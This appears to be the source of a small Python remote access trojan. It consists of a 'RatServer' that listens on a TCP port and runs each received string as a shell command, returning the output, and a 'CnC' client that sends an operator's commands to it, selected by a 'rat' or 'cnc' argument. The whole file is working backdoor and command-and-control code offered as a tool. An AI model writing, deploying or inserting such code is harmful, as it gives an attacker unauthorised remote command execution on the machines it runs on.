import socket
import subprocess
import sys

from src.net.banner import Banner


class SockUtils:
    @staticmethod
    def recvall(sock):
        BUFF_SIZE = 4096  # noqa
        data = b''
        while True:
            part = sock.recv(BUFF_SIZE)
            data += part
            if len(part) < BUFF_SIZE:
                # either 0 or end of data
                break
        return data


class RatServer:
    def __init__(self, host: str = '127.0.0.1', port: int = 777):
        self.host = host
        self.port = port

    def launch(self):
        host = self.host
        port = self.port
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.bind((host, port))
            server_socket.listen(1)
            server_socket.settimeout(10)
            print(f"Server listening on {host}:{port}")

            connection, address = server_socket.accept()
            with connection:
                print(f"Connected to {address}")

                while True:
                    data = SockUtils.recvall(connection)
                    if not data:
                        break

                    command = data.decode()
                    print(f"> {command}")
                    try:
                        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        output, error = process.communicate()
                        if output:
                            connection.sendall(output)
                        if error:
                            connection.sendall(error)
                    except Exception as e:
                        connection.sendall(str(e).encode())


class CnC:
    def __init__(self, host: str = '127.0.0.1', port: int = 777):
        self.host = host
        self.port = port

    def connect(self):
        host = self.host
        port = self.port
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((host, port))
            client_socket.settimeout(10)
            print(f"Connected to server {host}:{port}")

            while True:
                command = input("Enter command to execute (type 'quit' to exit): ")
                if command.lower() == 'quit':
                    break
                client_socket.sendall(command.encode())
                output = SockUtils.recvall(client_socket)
                print(output.decode())


if __name__ == '__main__':
    Banner()
    if len(sys.argv) > 1 and sys.argv[1] == 'cnc':
        CnC().connect()
    elif len(sys.argv) > 1 and sys.argv[1] == 'rat':
        RatServer().launch()
    else:
        print("Usage: python <script_name> [cnc | rat]")
